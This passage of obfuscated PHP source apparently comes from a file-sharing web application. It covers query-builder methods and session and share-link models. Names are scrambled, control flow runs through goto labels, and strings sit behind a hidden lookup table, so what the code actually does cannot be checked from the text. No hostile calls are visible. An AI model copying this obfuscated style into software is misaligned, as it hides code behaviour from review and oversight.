$a·¥äÆ ? array_keys($a·¥äÆ) : !1; } if ($this->fields) { $a·¥äÆ = $this->fields; unset($a·¥äÆ[$C¤—¯§ò¶[234]], $a·¥äÆ[$C¤—¯§ò¶[235]], $a·¥äÆ[$C¤—¯§ò¶[236]], $a·¥äÆ[$C¤—¯§ò¶[233]]); return $a·¥äÆ; } return !1; } public function data($e”ˆ¨´ê˜§ = '') { $a¼“®„•Í =& $_SERVER[Õİõş]; if ($a¼“®„•Í[33] === $e”ˆ¨´ê˜§ && !empty($this->data)) { return $this->data; } if (is_object($e”ˆ¨´ê˜§)) { $e”ˆ¨´ê˜§ = get_object_vars($e”ˆ¨´ê˜§); } elseif (is_string($e”ˆ¨´ê˜§)) { parse_str($e”ˆ¨´ê˜§, $e”ˆ¨´ê˜§); } elseif (!is_array($e”ˆ¨´ê˜§)) { think_exception(think_lang($a¼“®„•Í[255])); } $this->data = $e”ˆ¨´ê˜§; return $this; } public function join($Bä«ªÒ¦·) { $Dİ¢ÏŞÁä =& $_SERVER[Õİõş]; if (is_array($Bä«ªÒ¦·)) { $this->options[$Dİ¢ÏŞÁä[266]] = $Bä«ªÒ¦·; } elseif (!empty($Bä«ªÒ¦·)) { $this->options[$Dİ¢ÏŞÁä[266]][] = $Bä«ªÒ¦·; } return $this; } public function union($D¬¡ £ÄİÌ, $cÜ¦…ß¿Ä² = false) { goto dã²õí¶ãŠ; dŠ†­†ì­Ô: if (is_object($D¬¡ £ÄİÌ)) { $D¬¡ £ÄİÌ = get_object_vars($D¬¡ £ÄİÌ); } if (is_string($D¬¡ £ÄİÌ)) { $AÖ‡ ¯ã¤“ = $D¬¡ £ÄİÌ; } elseif (is_array($D¬¡ £ÄİÌ)) { if (isset($D¬¡ £ÄİÌ[0])) { $this->options[$bòñ‹ää¥Î[331]] = array_merge($this->options[$bòñ‹ää¥Î[331]], $D¬¡ £ÄİÌ); return $this; } else { $AÖ‡ ¯ã¤“ = $D¬¡ £ÄİÌ; } } else { think_exception(think_lang($bòñ‹ää¥Î[255])); } $this->options[$bòñ‹ää¥Î[331]][] = $AÖ‡ ¯ã¤“; goto dÒ³™¦ƒ‡ô; dÒ³™¦ƒ‡ô: return $this; goto cÕ¥¨ ¥Éê; dã²õí¶ãŠ: $bòñ‹ää¥Î =& $_SERVER[Õİõş]; if (empty($D¬¡ £ÄİÌ)) { return $this; } if ($cÜ¦…ß¿Ä²) { $this->options[$bòñ‹ää¥Î[331]][$bòñ‹ää¥Î[332]] = !0; } goto dŠ†­†ì­Ô; cÕ¥¨ ¥Éê: } public function cache($E‹Ç‚…ï¼ = true, $Dö‚•ÁÅ™º = null, $EŒ°ÉÉŸ›· = '') { $C•›ÛÀïÒº =& $_SERVER[Õİõş]; if (!1 !== $E‹Ç‚…ï¼) { $this->options[$C•›ÛÀïÒº[333]] = array($C•›ÛÀïÒº[89] => $E‹Ç‚…ï¼, $C•›ÛÀïÒº[323] => $Dö‚•ÁÅ™º, $C•›ÛÀïÒº[29] => $EŒ°ÉÉŸ›·); } return $this; } public function field($dÏé¾âÁ, $eÍ³Àµå’š = false) { $bè™®à‡— =& $_SERVER[Õİõş]; if (!0 === $dÏé¾âÁ) { $CáÜØËÁ—á = $this->getDbFields(); $dÏé¾âÁ = $CáÜØËÁ—á ? $CáÜØËÁ—á : $bè™®à‡—[172]; } elseif ($eÍ³Àµå’š) { if (is_string($dÏé¾âÁ)) { $dÏé¾âÁ = explode($bè™®à‡—[47], $dÏé¾âÁ); } $CáÜØËÁ—á = $this->getDbFields(); $dÏé¾âÁ = $CáÜØËÁ—á ? array_diff($CáÜØËÁ—á, $dÏé¾âÁ) : $dÏé¾âÁ; } $this->options[$bè™®à‡—[257]] = $dÏé¾âÁ; return $this; } public function scope($b›ŒÒ»ãË = '', $F¯Õ¹¢Î  = NULL) { $Cƒôó¡Î× =& $_SERVER[Õİõş]; if ($Cƒôó¡Î×[33] === $b›ŒÒ»ãË) { if (isset($this->_scope[$Cƒôó¡Î×[34]])) { $BÆ‚â–÷ùÁ = $this->_scope[$Cƒôó¡Î×[34]]; } else { return $this; } } elseif (is_string($b›ŒÒ»ãË)) { $FºÔíË¥ªè = explode($Cƒôó¡Î×[47], $b›ŒÒ»ãË); $BÆ‚â–÷ùÁ = array(); foreach ($FºÔíË¥ªè as $Cº’†ÊÓàñ) { if (!isset($this->_scope[$Cº’†ÊÓàñ])) { continue; } $BÆ‚â–÷ùÁ = array_merge($BÆ‚â–÷ùÁ, $this->_scope[$Cº’†ÊÓàñ]); } if (!empty($F¯Õ¹¢Î ) && is_array($F¯Õ¹¢Î )) { $BÆ‚â–÷ùÁ = array_merge($BÆ‚â–÷ùÁ, $F¯Õ¹¢Î ); } } elseif (is_array($b›ŒÒ»ãË)) { $BÆ‚â–÷ùÁ = $b›ŒÒ»ãË; } if (is_array($BÆ‚â–÷ùÁ) && !empty($BÆ‚â–÷ùÁ)) { $this->options = array_merge($this->options, array_change_key_case($BÆ‚â–÷ùÁ)); } return $this; } public function where($Eš›â£È¢ , $DØÍ°¡—æã = null) { $a‘ÍöÍæì” =& $_SERVER[Õİõş]; if (!is_null($DØÍ°¡—æã) && is_string($Eš›â£È¢ )) { if (!is_array($DØÍ°¡—æã)) { $DØÍ°¡—æã = func_get_args(); array_shift($DØÍ°¡—æã); } $DØÍ°¡—æã = array_map(array($this->db, $a‘ÍöÍæì”[327]), $DØÍ°¡—æã); $Eš›â£È¢  = vsprintf($Eš›â£È¢ , $DØÍ°¡—æã); } elseif (is_object($Eš›â£È¢ )) { $Eš›â£È¢  = get_object_vars($Eš›â£È¢ ); } elseif (is_array($Eš›â£È¢ )) { foreach ($Eš›â£È¢  as $aî¦÷ô™ƒ => $c»Šà‚³¤) { if ((is_numeric($aî¦÷ô™ƒ) || !$aî¦÷ô™ƒ) && is_string($c»Šà‚³¤)) { think_trace($a‘ÍöÍæì”[334], $a‘ÍöÍæì”[33], $a‘ÍöÍæì”[46]); die; } } } if (is_string($Eš›â£È¢ ) && $a‘ÍöÍæì”[33] != $Eš›â£È¢ ) { $Cœç‹´ëŠ = array(); $Cœç‹´ëŠ[$a‘ÍöÍæì”[335]] = $Eš›â£È¢ ; $Eš›â£È¢  = $Cœç‹´ëŠ; } if (isset($this->options[$a‘ÍöÍæì”[259]])) { $this->options[$a‘ÍöÍæì”[259]] = array_merge($this->options[$a‘ÍöÍæì”[259]], $Eš›â£È¢ ); } else { $this->options[$a‘ÍöÍæì”[259]] = $Eš›â£È¢ ; } return $this; } public function limit($a¼ˆ­‚µùÅ, $a°Üå­æ² = null) { $EÜîğ‰ŞÉÕ =& $_SERVER[Õİõş]; $this->options[$EÜîğ‰ŞÉÕ[276]] = is_null($a°Üå­æ²) ? $a¼ˆ­‚µùÅ : $a¼ˆ­‚µùÅ . $EÜîğ‰ŞÉÕ[47] . $a°Üå­æ²; return $this; } public function page($CîÔøĞô¥, $bŠº”Í¶½„ = null) { $d½åî–’ÅÅ =& $_SERVER[Õİõş]; $this->options[$d½åî–’ÅÅ[336]] = is_null($bŠº”Í¶½„) ? $CîÔøĞô¥ : $CîÔøĞô¥ . $d½åî–’ÅÅ[47] . $bŠº”Í¶½„; return $this; } public function comment($aÍ©½†Áô) { $this->options[$_SERVER[Õİõş][337]] = $aÍ©½†Áô; return $this; } public function setProperty($A ˆŒ‚ÊÒ, $C³øª™­Õ‚) { if (property_exists($this, $A ˆŒ‚ÊÒ)) { $this->{$A ˆŒ‚ÊÒ} = $C³øª™­Õ‚; } return $this; } } goto bøˆ²â®‘ì; F£Àëƒ‰×‚: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\155\x5f\163\145\163\163\x69\x6f\156"; public function get($B£ëŸÎ¨šç) { $C©—Ô¬»ã» =& $_SERVER[Õİõş]; $A´¨¡ó¼„ø = $this->where(array($C©—Ô¬»ã»[2181] => $B£ëŸÎ¨šç))->find(); if (!is_array($A´¨¡ó¼„ø)) { return !1; } return $A´¨¡ó¼„ø[$C©—Ô¬»ã»[694]]; } public function set($D§Õ·ğÂˆ•, $BÚÇ‘¶ÃØ, $cÔ°Š…öÖ = 3600) { $eÏÛµÁÔ× =& $_SERVER[Õİõş]; $dÔƒæ„ì˜ = array($eÏÛµÁÔ×[2181] => $D§Õ·ğÂˆ•, $eÏÛµÁÔ×[2110] => $BÚÇ‘¶ÃØ, $eÏÛµÁÔ×[2182] => $cÔ°Š…öÖ + time()); if (Session::get($eÏÛµÁÔ×[2183])) { $dÔƒæ„ì˜[$eÏÛµÁÔ×[1417]] = Session::get($eÏÛµÁÔ×[2183]); } else { $dÔƒæ„ì˜[$eÏÛµÁÔ×[1417]] = 0; } if ($this->get($D§Õ·ğÂˆ•)) { return $this->where(array($eÏÛµÁÔ×[2181] => $D§Õ·ğÂˆ•))->save($dÔƒæ„ì˜); } else { return $this->add($dÔƒæ„ì˜, array(), !0); } } public function remove($BíÚ“½ñ®õ) { return $this->where(array($_SERVER[Õİõş][2181] => $BíÚ“½ñ®õ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Õİõş][2184] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\x79\x54\151\x6d\x65", "\164\151\155\x65", "\x69\156\x73\x65\162\x74\x2c\x75\160\144\141\x74\145", "\x66\165\156\x63\164\x69\157\x6e"), array("\x63\162\x65\x61\x74\145\x54\151\155\x65", "\x74\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\157\160\x74\x69\157\156\163", '', "\151\156\163\x65\162\x74\x2c\165\x70\x64\x61\164\x65\x2c\x73\x65\x6c\145\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($d“½õí„ÊÄ) { $dŞ–‰…œ“ =& $_SERVER[Õİõş]; $E·ÖÒ‚‚Ÿ = isset($d“½õí„ÊÄ[0]) ? $d“½õí„ÊÄ[0] : !1; return array($dŞ–‰…œ“[2185] => array(USER_ID, $dŞ–‰…œ“[2186]), $dŞ–‰…œ“[2148] => array($E·ÖÒ‚‚Ÿ, $dŞ–‰…œ“[2187])); } protected function listSimple() { $EºÛ±Ïñ ¾ = array($_SERVER[Õİõş][1417] => USER_ID); $e£êùÅàŞô = $this->field($this->fieldList)->where($EºÛ±Ïñ ¾)->select(); return $e£êùÅàŞô ? $e£êùÅàŞô : array(); } protected function getInfo($bİÇİáä­·, $AĞ­’ÄÔÈí = false) { $AÇ„Äòˆê =& $_SERVER[Õİõş]; if ($AĞ­’ÄÔÈí) { return $this->_getShareInfo(array($AÇ„Äòˆê[436] => $bİÇİáä­·)); } $Eéî›Ê¿ˆ = $this->cacheFunctionGet($AÇ„Äòˆê[2188], $bİÇİáä­·); return $Eéî›Ê¿ˆ; } public function getInfoByHash($eï”›ƒ °) { return $this->_getShareInfo(array($_SERVER[Õİõş][438] => $eï”›ƒ °)); } public function getInfoByPath($CÌ›ƒ«ÁìÙ) { $AØâ¤¥í¬ =& $_SERVER[Õİõş]; $fÜ½‚„Áá = array($AØâ¤¥í¬[1417] => USER_ID, $AØâ¤¥í¬[365] => $CÌ›ƒ«ÁìÙ); return $this->_getShareInfo($fÜ½‚„Áá); } public function getInfoBySourcePath($a¶ÔñõÏ»›) { $EŠ¤¨£óÏ =& $_SERVER[Õİõş]; $f±¯ßö´šù = array($EŠ¤¨£óÏ[1417] => USER_ID, $EŠ¤¨£óÏ[1020] => $a¶ÔñõÏ»›); return $this->_getShareInfo($f±¯ßö´šù); } private function _getShareInfo($CŒ©‹í­­ñ) { goto DÉÒ£Áê¢; AøÒäŠ¹…: $CŒ©‹í­­ñ = array($CÄîßéÆš¹[436] => $c îÒËÄ†ß[$CÄîßéÆš¹[436]]); $eĞ¿‹ĞÎè = $CÄîßéÆš¹[2189]; $eµøèùéÎ¤ = Model($CÄîßéÆš¹[532])->order($CÄîßéÆš¹[363])->field($eĞ¿‹ĞÎè)->where($CŒ©‹í­­ñ)->select(); goto bÛç–İ¤›™; DÉÒ£Áê¢: $CÄîßéÆš¹ =& $_SERVER[Õİõş]; $c îÒËÄ†ß = $this->where($CŒ©‹í­­ñ)->find(); if (!$c îÒËÄ†ß) { return !1; } goto AøÒäŠ¹…; bÛç–İ¤›™: if ($c îÒËÄ†ß[$CÄîßéÆš¹[365]] == $CÄîßéÆš¹[463]) { $c îÒËÄ†ß[$CÄîßéÆš¹[387]] = IO::info($c îÒËÄ†ß[$CÄîßéÆš¹[1020]]); } else { $c îÒËÄ†ß[$CÄîßéÆš¹[387]] = Model($CÄîßéÆš¹[1113])->pathInfo($c îÒËÄ†ß[$CÄîßéÆš¹[365]]); } $c îÒËÄ†ß[$CÄîßéÆš¹[2190]] = $eµøèùéÎ¤; return $c îÒËÄ†ß; goto dÎË‘ÊÛî‰; dÎË‘ÊÛî‰: } protected function getInfoAuth($Dèè°í§ à) { $b„†ŒÆ£ÔŸ =& $_SERVER[Õİõş]; $Fè¡•‹å‚Á = $this->getInfo($Dèè°í§ à); $Fè¡•‹å‚Á[$b„†ŒÆ£ÔŸ[372]] = Model($b„†ŒÆ£ÔŸ[449])->authMake($Fè¡•‹å‚Á[$b„†ŒÆ£ÔŸ[2190]]); return $Fè¡•‹å‚Á; } protected function listData($E¬Åá‰›Ü¦ = null, $d£×Ø¿Ã£Ú = 300) { $fã™ÃÚøä¤ =& $_SERVER[Õİõş]; $F„ê¯ïÃœÛ = array(array($fã™ÃÚøä¤[441] => array($fã™ÃÚøä¤[930], 0), $fã™ÃÚøä¤[443] => array($fã™ÃÚøä¤[930], 0), $fã™ÃÚøä¤[2191] => $fã™ÃÚøä¤[2160])); if ($E¬Åá‰›Ü¦ == $fã™ÃÚøä¤[1847]) { $F„ê¯ïÃœÛ = array($fã™ÃÚøä¤[441] => 1); } else { if ($E¬Åá‰›Ü¦ == $fã™ÃÚøä¤[1009]) { $F„ê¯ïÃœÛ = array($fã™ÃÚøä¤[443] => 1); } } $F„ê¯ïÃœÛ[$fã™ÃÚøä¤[1417]] = USER_ID; $eÈÆ§‰™ß = $this->where($F„ê¯ïÃœÛ)->selectPage($d£×Ø¿Ã£Ú); return $eÈÆ§‰™ß; } protected function listToMe($B¹ÊºÔà¸ß = 300) { goto fèùÏ‚¤¥ê; c‡è×ˆÑã: $CÎ‰×ÒÊ’÷ = array($B˜İ­¾œÚÈ[436] => array($B˜İ­¾œÚÈ[380], array_keys($D¸™¥ğÓ))); $B’¡Œ¬‚Ş = $this->field($FŒ˜ÇÍ»†)->where($CÎ‰×ÒÊ’÷)->select(); foreach ($B’¡Œ¬‚Ş as $cŠŠ¢ÙÒ¾ => &$AÁºÑÚëÆ) { $AÁºÑÚëÆ[$B˜İ­¾œÚÈ[2190]] = $D¸™¥ğÓ[$AÁºÑÚëÆ[$B˜İ­¾œÚÈ[436]]]; } goto A›å«µ‡ôø; b˜‡¡ëËÕ : $D¸™¥ğÓ = array_to_keyvalue_group($c©³šÃì¥Á[$B˜İ­¾œÚÈ[350]], $B˜İ­¾œÚÈ[436]); if (!$D¸™¥ğÓ) { return $c©³šÃì¥Á; } $FŒ˜ÇÍ»† = $B˜İ­¾œÚÈ[2193]; goto c‡è×ˆÑã; e¥—‚“„„: $CÎ‰×ÒÊ’÷ = array($B˜İ­¾œÚÈ[516] => SourceModel::TYPE_USER, $B˜İ­¾œÚÈ[451] => USER_ID); if ($eÇß«‘‡“¸) { $CÎ‰×ÒÊ’÷ = array(array($B˜İ­¾œÚÈ[516] => SourceModel::TYPE_USER, $B˜İ­¾œÚÈ[451] => USER_ID), array($B˜İ­¾œÚÈ[516] => SourceModel::TYPE_GROUP, $B˜İ­¾œÚÈ[451] => array($B˜İ­¾œÚÈ[7], $eÇß«‘‡“¸)), $B˜İ­¾œÚÈ[2191] => $B˜İ­¾œÚÈ[2160]); } $c©³šÃì¥Á = Model($B˜İ­¾œÚÈ[532])->where($CÎ‰×ÒÊ’÷)->selectPage($B¹ÊºÔà¸ß); goto b˜‡¡ëËÕ ; fèùÏ‚¤¥ê: $B˜İ­¾œÚÈ =& $_SERVER[Õİõş]; $f˜Ø¯—Ÿ³ = Session::get($B˜İ­¾œÚÈ[2192]); $eÇß«‘‡“¸ = array_to_keyvalue($f˜Ø¯—Ÿ³, $B˜İ­¾œÚÈ[33], $B˜İ­¾œÚÈ[2080]); goto e¥—‚“„„; A›å«µ‡ôø: $bõÎí—Èœ = array($B˜İ­¾œÚÈ[2194] => $B’¡Œ¬‚Ş, $B˜İ­¾œÚÈ[2195] => $c©³šÃì¥Á[$B˜İ­¾œÚÈ[347]]); return $bõÎí—Èœ; goto AÌÓùº‚×; AÌÓùº‚×: } protected function shareAdd($Dî¦¹»ÎÙÕ, $d÷àÂ¶¬¤Ù) { $câÍŠ˜‘› =& $_SERVER[Õİõş]; $cÑ…âÌĞ£“ = $this->_addShareData($Dî¦¹»ÎÙÕ, $d÷àÂ¶¬¤Ù); if (!empty($d÷àÂ¶¬¤Ù[$câÍŠ˜‘›[2196]])) { $this->_shareAuthSet($cÑ…âÌĞ£“, $d÷àÂ¶¬¤Ù[$câÍŠ˜‘›[2196]]); } $this->shareEventAdd($Dî¦¹»ÎÙÕ, $d÷àÂ¶¬¤Ù, $câÍŠ˜‘›[1012]); return $cÑ…âÌĞ£“; } private function shareEventAdd($BÀ¹‘Ş‘ê, $E—Ø£õÑø, $e‹í²ˆ±˜’ = "\x61\144\144") { goto dåÄËÉ•â¯; dåÄËÉ•â¯: $dÀä­Ğ‹†õ =& $_SERVER[Õİõş]; if ($e‹í²ˆ±˜’ == $dÀä­Ğ‹†õ[1012]) { if ($E—Ø£õÑø[$dÀä­Ğ‹†õ[441]] == $dÀä­Ğ‹†õ[83]) { Model($dÀä­Ğ‹†õ[500])->eventShare($BÀ¹‘Ş‘ê, $dÀä­Ğ‹†õ[2197]); } if ($E—Ø£õÑø[$dÀä­Ğ‹†õ[443]] == $dÀä­Ğ‹†õ[83]) { Model($dÀä­Ğ‹†õ[500])->eventShare($BÀ¹‘Ş‘ê, $dÀä­Ğ‹†õ[2198]); } return; } $cîôø³ÚÁ = $this->getInfoByPath($BÀ¹‘Ş‘ê); goto FòëÑÏø«‰; cŠÛÊ‘¹Ë: if ($cîôø³ÚÁ[$dÀä­Ğ‹†õ[443]] == $dÀä­Ğ‹†õ[463] && $E—Ø£õÑø[$dÀä­Ğ‹†õ[443]] == $dÀä­Ğ‹†õ[83]) { $e«¹Œ®Ûƒ = $dÀä­Ğ‹†õ[2198]; } if ($cîôø³ÚÁ[$dÀä­Ğ‹†õ[443]] == $dÀä­Ğ‹†õ[83] && $E—Ø£õÑø[$dÀä­Ğ‹†õ[443]] == $dÀä­Ğ‹†õ[463]) { $e«¹Œ®Ûƒ = $dÀä­Ğ‹†õ[2201]; } Model($dÀä­Ğ‹†õ[500])->eventShare($BÀ¹‘Ş‘ê, $e«¹Œ®Ûƒ); goto eÙÖ¿ƒÛÍ±; eÙÖ¿ƒÛÍ±: return; goto f£‰†»İëç; FòëÑÏø«‰: $e«¹Œ®Ûƒ = $dÀä­Ğ‹†õ[2199]; if ($cîôø³ÚÁ[$dÀä­Ğ‹†õ[441]] == $dÀä­Ğ‹†õ[463] && $E—Ø£õÑø[$dÀä­Ğ‹†õ[441]] == $dÀä­Ğ‹†õ[83]) { $e«¹Œ®Ûƒ = $dÀä­Ğ‹†õ[2197]; } if ($cîôø³ÚÁ[$dÀä­Ğ‹†õ[441]] == $dÀä­Ğ‹†õ[83] && $E—Ø£õÑø[$dÀä­Ğ‹†õ[441]] == $dÀä­Ğ‹†õ[463]) { $e«¹Œ®Ûƒ = $dÀä­Ğ‹†õ[2200]; } goto cŠÛÊ‘¹Ë; f£‰†»İëç: } private function _addShareData($Bì‚Ã¬§½ö, $fÃ“ˆİ§åñ = array()) { goto b´°‹Š­À•; dÀŸ¥°õ‘†: return $FŸ‹»ƒÃóÙ; goto Eœéƒš«ª; b´°‹Š­À•: $a‘®­ÑÈ×Ï =& $_SERVER[Õİõş]; $d’ÓÈŞ†” = array($a‘®­ÑÈ×Ï[379] => $Bì‚Ã¬§½ö, $a‘®­ÑÈ×Ï[1408] => USER_ID); if ($Bì‚Ã¬§½ö == 0) { $d’ÓÈŞ†” = array($a‘®­ÑÈ×Ï[2202] => $fÃ“ˆİ§åñ[$a‘®­ÑÈ×Ï[1020]], $a‘®­ÑÈ×Ï[1408] => USER_ID); } goto BéæøäÉ²¨; EøÉ´Ö®æ: $D‚Ãù¤™¤Ô = array($a‘®­ÑÈ×Ï[1408] => USER_ID, $a‘®­ÑÈ×Ï[379] => $Bì‚Ã¬§½ö, $a‘®­ÑÈ×Ï[1325] => $a‘®­ÑÈ×Ï[33], $a‘®­ÑÈ×Ï[441] => 0, $a‘®­ÑÈ×Ï[443] => 0, $a‘®­ÑÈ×Ï[1020] => $a‘®­ÑÈ×Ï[33], $a‘®­ÑÈ×Ï[291] => $a‘®­ÑÈ×Ï[33], $a‘®­ÑÈ×Ï[806] => $a‘®­ÑÈ×Ï[33], $a‘®­ÑÈ×Ï[2203] => 0, $a‘®­ÑÈ×Ï[2204] => 0, $a‘®­ÑÈ×Ï[705] => 0, $a‘®­ÑÈ×Ï[2205] => $a‘®­ÑÈ×Ï[33], $a‘®­ÑÈ×Ï[438] => $a‘®­ÑÈ×Ï[33]); $e”…Ğñ·‚‹ = explode($a‘®­ÑÈ×Ï[47], $a‘®­ÑÈ×Ï[2206]); foreach ($e”…Ğñ·‚‹ as $e¹„ìˆ“»ğ) { if (!isset($fÃ“ˆİ§åñ[$e¹„ìˆ“»ğ])) { continue; } $D‚Ãù¤™¤Ô[$e¹„ìˆ“»ğ] = $fÃ“ˆİ§åñ[$e¹„ìˆ“»ğ]; } goto c‘ÇŠè±ää; c‘ÇŠè±ää: $FŸ‹»ƒÃóÙ = $this->add($D‚Ãù¤™¤Ô); $AŒ„¨İãœİ = array($a‘®­ÑÈ×Ï[438] => short_id($FŸ‹»ƒÃóÙ)); $this->where(array($a‘®­ÑÈ×Ï[435] => $FŸ‹»ƒÃóÙ))->save($AŒ„¨İãœİ); goto dÀŸ¥°õ‘†; BéæøäÉ²¨: if ($D¡Ñ¯çÚ¤ = $this->where($d’ÓÈŞ†”)->find()) { return $D¡Ñ¯çÚ¤[$a‘®­ÑÈ×Ï[436]]; } if ($Bì‚Ã¬§½ö == 0) { $dÉƒ˜¡¯½Ç = array($a‘®­ÑÈ×Ï[28] => get_path_this($fÃ“ˆİ§åñ[$a‘®­ÑÈ×Ï[75]])); } else { $dÉƒ˜¡¯½Ç = Model($a‘®­ÑÈ×Ï[754])->sourceInfo($Bì‚Ã¬§½ö); if (!$dÉƒ˜¡¯½Ç) { return !1; } } if (!$fÃ“ˆİ§åñ[$a‘®­ÑÈ×Ï[1325]]) { $fÃ“ˆİ§åñ[$a‘®­ÑÈ×Ï[1325]] = $dÉƒ˜¡¯½Ç[$a‘®­ÑÈ×Ï[28]]; } goto EøÉ´Ö®æ; Eœéƒš«ª: } private function _shareAuthSet($fæÉ¾“ßîŞ, $Dä­‹ŒîíÃ) { goto fêæ–ˆŞà; C²êîÆÛá¸: $a¼‰‰ÕÕï…->where(array($Eµôø¡¨š«[436] => $fæÉ¾“ßîŞ))->delete(); $fº‡äÀëàÊ = array(); foreach ($Dä­‹ŒîíÃ as $EÈË–Úù‘) { $D¸Š¡ŸŒŠİ = SourceModel::TYPE_USER; if ($EÈË–Úù‘[$Eµôø¡¨š«[367]] == SourceModel::TYPE_GROUP) { $D¸Š¡ŸŒŠİ = SourceModel::TYPE_GROUP; } $F²ÚÄ»í‰ = array($Eµôø¡¨š«[436] => $fæÉ¾“ßîŞ, $Eµôø¡¨š«[367] => $D¸Š¡ŸŒŠİ, $Eµôø¡¨š«[451] => intval($EÈË–Úù‘[$Eµôø¡¨š«[451]]), $Eµôø¡¨š«[2208] => 0, $Eµôø¡¨š«[2209] => -1); if ($EÈË–Úù‘[$Eµôø¡¨š«[2208]]) { $F²ÚÄ»í‰[$Eµôø¡¨š«[2208]] = $EÈË–Úù‘[$Eµôø¡¨š«[2208]]; } else { if ($EÈË–Úù‘[$Eµôø¡¨š«[2209]]) { $F²ÚÄ»í‰[$Eµôø¡¨š«[2209]] = $EÈË–Úù‘[$Eµôø¡¨š«[2209]]; } } $fº‡äÀëàÊ[] = $F²ÚÄ»í‰; } goto b©æÄî†; fêæ–ˆŞà: $Eµôø¡¨š« =& $_SERVER[Õİõş]; if (!is_array($Dä­‹ŒîíÃ)) { return !1; } $a¼‰‰ÕÕï… = Model($Eµôø¡¨š«[2207]); goto C²êîÆÛá¸; b©æÄî†: return $a¼‰‰ÕÕï…->addAll($fº‡äÀëàÊ, array(), !0); goto EîŒ¥˜á×¯; EîŒ¥˜á×¯: } public function numViewAdd($e÷¡Ä¯×ŠŒ) { $e¸µâòÅ†Ç =& $_SERVER[Õİõş]; $d“‹²¯‹í° = array($e¸µâòÅ†Ç[435] => $e÷¡Ä¯×ŠŒ); $this->where($d“‹²¯‹í°)->setAdd($e¸µâòÅ†Ç[2203]); } public function numDownloadAdd($B¢ò‡ùèåõ) { $d‘­ÄÉ¤Œ” =& $_SERVER[Õİõş]; $AÅÁ¨¿² = array($d‘­ÄÉ¤Œ”[435] => $B¢ò‡ùèåõ); $this->where($AÅÁ¨¿²)->setAdd($d‘­ÄÉ¤Œ”[2204]); } protected function shareEdit($E¶ÖĞâ£È, $C•ƒÀ«ÙêË) { goto aâ¿³ù‰Á; Fòš›âÈå: $this->_checkLinkShare($C•ƒÀ«ÙêË, $B÷‘ÃØŸ¯); $bİ›´œÜÑ± = array(); $dÕ…Ş‰„© = explode($e‰’Ğó®ˆË[47], $e‰’Ğó®ˆË[2210]); goto aÅ®Ú‰‚ë ; aâ¿³ù‰Á: $e‰’Ğó®ˆË =& $_SERVER[Õİõş]; $B÷‘ÃØŸ¯ = $this->getInfo($E¶ÖĞâ£È); if (!$B÷‘ÃØŸ¯) { return !1; } goto Fòš›âÈå; B±ˆ”×Û‘: if (isset($C•ƒÀ«ÙêË[$e‰’Ğó®ˆË[2196]])) { $this->_shareAuthSet($E¶ÖĞâ£È, $C•ƒÀ«ÙêË[$e‰’Ğó®ˆË[2196]]); } return !0; goto bÛÈ¿˜§ªê; aÅ®Ú‰‚ë : foreach ($dÕ…Ş‰„© as $b–°¯˜¬Œ) { if (!array_key_exists($b–°¯˜¬Œ, $C•ƒÀ«ÙêË)) { continue; } $bİ›´œÜÑ±[$b–°¯˜¬Œ] = $C•ƒÀ«ÙêË[$b–°¯˜¬Œ]; } $this->shareEventAdd($B÷‘ÃØŸ¯[$e‰’Ğó®ˆË[365]], $C•ƒÀ«ÙêË, $e‰’Ğó®ˆË[2048]); $this->where(array($e‰’Ğó®ˆË[435] => $E¶ÖĞâ£È))->save($bİ›´œÜÑ±); goto B±ˆ”×Û‘; bÛÈ¿˜§ªê: } private function _checkLinkShare($aßÃ‡†İ‡Õ, $bè¯¼¬ŠÄ) { goto DŠ‡…º; A“’…ÙöÓ: if ($bè¯¼¬ŠÄ[$BøÂ˜ˆÈ†´[387]][$BøÂ˜ˆÈ†´[29]] != $BøÂ˜ˆÈ†´[163]) { $E½ùïÍš¤Â = $this->_folderReport($AÆË¹‹ôš); if (!$E½ùïÍš¤Â) { return; } show_json(LNG($BøÂ˜ˆÈ†´[2211]) . $BøÂ˜ˆÈ†´[2212] . $E½ùïÍš¤Â, !1); } $aØùùÆ»‹İ = Model($BøÂ˜ˆÈ†´[754])->fileInfoGet($bè¯¼¬ŠÄ[$BøÂ˜ˆÈ†´[387]][$BøÂ˜ˆÈ†´[365]]); if (!$aØùùÆ»‹İ) { return; } goto Fƒ­ô•™…Å; Fƒ­ô•™…Å: $a§ÑÖÓáß— = $this->shareFileMeta($aØùùÆ»‹İ[$BøÂ˜ˆÈ†´[414]]); if (isset($a§ÑÖÓáß—[$BøÂ˜ˆÈ†´[355]]) && $a§ÑÖÓáß—[$BøÂ˜ˆÈ†´[355]] == $BøÂ˜ˆÈ†´[83]) { show_json(LNG($BøÂ˜ˆÈ†´[2213]), !1); } goto a‚ƒÁ—¼Ÿä; DŠ‡…º: $BøÂ˜ˆÈ†´ =& $_SERVER[Õİõş]; if ($aßÃ‡†İ‡Õ[$BøÂ˜ˆÈ†´[441]] != $BøÂ˜ˆÈ†´[83]) { return; } $AÆË¹‹ôš = $bè¯¼¬ŠÄ[$BøÂ˜ˆÈ†´[387]][$BøÂ˜ˆÈ†´[365]]; goto A“’…ÙöÓ; a‚ƒÁ—¼Ÿä: } private function _folderReport($d¢³éŒáê†) { goto eƒë¶âË¶ô; d‚Æ‰ÓâÉ‚: $Dİ±ßíÀ‚ = array_to_keyvalue($C·ºš”­ä´, $cœÃçÔ‡‚‘[33], $cœÃçÔ‡‚‘[28]); $Dİ±ßíÀ‚[] = $cÄÅÉæÜÍ„[$cœÃçÔ‡‚‘[28]]; return implode($cœÃçÔ‡‚‘[8], $Dİ±ßíÀ‚); goto dîœ†àí¸Å; eƒë¶âË¶ô: $cœÃçÔ‡‚‘ =& $_SERVER[Õİõş]; $EÈôÑÍ”Äì = array($cœÃçÔ‡‚‘[414] => array($cœÃçÔ‡‚‘[930], 0), $cœÃçÔ‡‚‘[691] => 3); $a¬Ê°áÃå = Model($cœÃçÔ‡‚‘[2214])->where($EÈôÑÍ”Äì)->field($cœÃçÔ‡‚‘[414])->select(); goto aœ¸¾ñ›µï; fÇµâ… µ: $B»ÚôÁ•ç = substr($cÄÅÉæÜÍ„[$cœÃçÔ‡‚‘[454]], 